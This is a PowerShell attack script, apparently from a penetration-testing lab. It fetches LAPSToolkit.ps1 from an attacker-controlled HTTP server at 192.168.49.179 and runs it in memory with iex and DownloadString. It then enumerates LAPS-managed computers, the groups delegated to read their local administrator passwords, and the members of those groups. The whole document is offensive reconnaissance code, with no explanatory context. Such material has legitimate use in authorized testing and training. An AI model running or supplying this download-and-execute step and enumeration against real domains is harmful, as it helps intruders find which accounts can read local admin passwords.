$httpServerUrl = "http://192.168.49.179:8000/"
$powerViewFile = "PowerView.ps1"
$lapsFile = "LAPSToolkit.ps1"
$workDir = "C:\Users\Public"
$domain = (Get-WmiObject win32_computersystem).Domain

iex (new-object system.net.webclient).downloadstring("${httpServerUrl}${lapsFile}")
$lapsOutFile = "$workDir\laps.txt"
Write-Output "[*] Finding LAPS Computers"
Write-Output "=========================="
$lapsComputers = Get-LAPSComputers -Domain $domain -DomainController $domain
$lapsComputers | Format-Table
Write-Output "[*] Finding LAPS Delegated Groups"
Write-Output "================================="
$lapsGroups = Find-LAPSDelegatedGroups -Domain $domain -DomainController $domain
$lapsGroups | Format-Table
$uniqueLapsGroups=@()
$lapsGroups | ForEach-Object { $group =  $_."Delegated Groups".SubString($_."Delegated Groups".IndexOf("\") + 1); if (-Not $uniqueLapsGroups -Contains $group) {$uniqueLapsGroups += $group}}
$uniqueLapsGroups | ForEach-Object { $group_members = Get-NetGroupMember -Domain $domain -DomainController $domain -GroupName $_; Write-Output "[*] Members of ${_}:" ; Write-Output $("=" * "[*] Members of ${_}:".Length) ; $group_members} 
